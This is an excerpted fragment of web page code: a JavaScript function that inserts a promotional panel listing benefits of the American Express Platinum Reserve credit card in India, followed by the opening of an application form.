...
function addProfessionalDetails()
{
	...
	ni2.innerHTML ='<div class="crdit_card_box" style="margin-top:2px;"> <img src="images/amx-platinum-reserve-credit-card-big.png" width="196" height="137"></div><div class="crdit_card_box"><table width="100%" border="0" cellpadding="0" cellspacing="0"><tr><td height="25" style="border-bottom:#a41b29 solid thin;"><span class="form_head_text">Platinum Reserve Credit Card Offers</span></td></tr><tr><td>&nbsp;</td></tr><tr><td class="bullet_text"><ul><li>Get a Welcome Gift of 22,000 Bonus Membership Rewards Points</li><li>Get Membership Rewards Point for every Rs.40 spent</li><li>Enjoy complimentary membership to Priority Pass, with the US$99 annual membership fee waived off exclusively for you</li><li>Get exclusive access to the luxurious American Express Platinum Lounges at Delhi and Mumbai Domestic Airports</li><li>Savour exciting “Dining Privileges” at Taj Hotels with complimentary membership to Taj Epicure Plus</li><li>Enjoy complimentary golf at 5 premier courses in India.</li></ul></td></tr></table></div>';
...
<body>
<form action="american-express-card-continue.php" method="post" name="cc_form" onSubmit="return chkform();">
...
<div class="left_inner_text_bx" style="margin-top:6px;">American Express® Platinum Reserve<sup style="font-size:10px;">SM</sup> Credit Card</div>
<div class="filed-box">
